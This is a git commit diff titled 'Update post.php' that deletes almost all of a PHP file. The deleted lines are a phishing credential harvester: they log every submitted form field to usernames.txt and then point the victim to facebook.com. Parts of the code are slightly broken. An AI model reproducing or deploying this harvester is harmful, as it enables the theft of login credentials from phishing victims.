70f7b5561a49463bbc55f250537385ac1e3f48b0
sidatibg1996 <157115066+sidatibg1996@users.noreply.github.com>
2024-12-26 13:59:44 +0100

    Update post.php

--- post.php
+++ post.php
@@ -1,13 +1,1 @@
 _<?php
-header ('https://facebook.com');
-$handle = fopen('usernames.txt', 'a');
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, '=');
-fwrite($handle, $value);
-fwrite($handle, 'rn');
-}
-fwrite($handle, 'rn');
-fclose($handle);
-exit;
-?> _
